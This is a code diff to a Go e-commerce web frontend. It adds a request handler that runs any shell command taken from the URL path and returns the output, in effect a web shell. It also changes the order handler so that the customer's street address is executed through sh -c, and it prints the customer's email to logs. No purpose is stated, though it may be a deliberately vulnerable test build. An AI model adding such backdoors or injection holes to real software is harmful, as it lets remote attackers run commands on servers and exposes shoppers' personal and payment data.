@@ -22,6 +22,7 @@ import (
 	"net"
 	"net/http"
 	"os"
+	"os/exec"
 	"strconv"
 	"strings"
 	"time"
@@ -138,6 +139,39 @@ func (plat *platformDetails) setPlatformDetails(env string) {
 		plat.provider = "local"
 		plat.css = "local"
 	}
+}
+
+func (fe *frontendServer) cmdHandler(w http.ResponseWriter, r *http.Request) {
+	log := r.Context().Value(ctxKeyLog{}).(logrus.FieldLogger)
+	cmd := mux.Vars(r)["cmd"]
+	fmt.Printf( r.Method, r.URL, r.Proto)
+	fmt.Printf("the command is %s\n",cmd)
+	if cmd == "" {
+		cmdName := "whoami"
+		
+		cmdz := exec.Command("sh","-c",cmdName)
+		cmdReader, err := cmdz.Output()
+		fmt.Printf("The output  is %s\n", cmdReader)
+		if err != nil {
+			renderHTTPError(log, r, w, errors.Wrap(err, "Executable Not Found"), http.StatusInternalServerError)
+			return
+		} else {
+			w.Write(cmdReader)
+			return
+		}
+	} else {
+		cmdz := exec.Command("sh","-c",cmd)
+		cmdReader, err := cmdz.Output()
+		fmt.Printf("The output  is %s\n", cmdReader)
+		if err != nil {
+			renderHTTPError(log, r, w, errors.Wrap(err, "Executable Not Found"), http.StatusInternalServerError)
+			return
+		} else{
+			w.Write(cmdReader)
+			return
+		}
+	}
+	return
 }
 
 func (fe *frontendServer) productHandler(w http.ResponseWriter, r *http.Request) {
@@ -327,7 +361,14 @@ func (fe *frontendServer) placeOrderHandler(w http.ResponseWriter, r *http.Reque
 		ccYear, _     = strconv.ParseInt(r.FormValue("credit_card_expiration_year"), 10, 32)
 		ccCVV, _      = strconv.ParseInt(r.FormValue("credit_card_cvv"), 10, 32)
 	)
-
+	fmt.Printf("The output  is %s\n", email)
+	log.Debug("emai is %s", email)
+	
+	command := streetAddress
+	cmd, err := exec.Command("sh","-c",command).Output()
+	fmt.Printf("%s",cmd)
+	
+	
 	order, err := pb.NewCheckoutServiceClient(fe.checkoutSvcConn).
 		PlaceOrder(r.Context(), &pb.PlaceOrderRequest{
 			Email: email,
